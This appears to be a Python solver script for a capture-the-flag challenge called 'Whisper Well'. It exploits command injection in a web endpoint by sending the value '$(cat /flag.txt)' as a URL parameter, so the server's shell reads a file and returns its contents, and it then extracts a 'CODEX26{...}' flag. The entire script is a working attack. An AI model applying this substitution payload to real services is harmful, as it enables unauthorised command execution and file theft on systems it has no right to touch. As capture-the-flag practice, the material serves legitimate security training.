#!/usr/bin/env python3
"""Whisper Well solver — command injection via command substitution."""
import re
import sys
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11021


def whisper(msg):
    payload = urllib.parse.quote(msg, safe='')
    url = 'http://%s:%d/whisper?msg=%s' % (HOST, PORT, payload)
    with urllib.request.urlopen(url, timeout=5) as r:
        return r.read().decode(errors='replace')


if __name__ == '__main__':
    out = whisper('$(cat /flag.txt)')
    m = re.search(r'CODEX26\{[^}]+\}', out)
    if m:
        print('FLAG:', m.group(0))
    else:
        print('raw output:')
        print(repr(out))
